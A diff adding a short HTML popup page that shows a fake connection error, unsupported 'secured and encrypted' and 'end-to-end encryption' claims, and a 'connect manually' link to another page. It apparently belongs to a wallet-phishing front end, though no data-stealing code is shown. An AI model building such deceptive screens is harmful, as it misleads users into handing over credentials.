@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="connect.css"
+</head>
+<body>
+    <div class="container">
+
+
+        
+   <button type="submit" class="btn" onclick="openpopup()">
+    
+   SUBMITTED
+    </button>
+
+
+
+
+    <div class="popup" id="popup">
+    <img src="wwww.png">
+    <p class="rect1">This session is secured and encrypted</p>
+    <P class="rect2"> An error occured... please try again or connect manually</P>
+    <div class="rect3">Try Again</div>
+    <a href="rectan2.html"><button type="button"  onclick="closepopup()">connect manually</button></a>
+<p class="rect4">This session is protected with an end-to-end encryption</p>
+   </div>
+    </div>
+    <script>
+        let popup =document.getElementById("popup");
+        function openpopup(){
+         popup.classList.add("open-popup");   
+        }
+
+        function closepopup(){
+         popup.classList.remove("open-popup");   
+        }
+    </script>
+</body>
+</html>
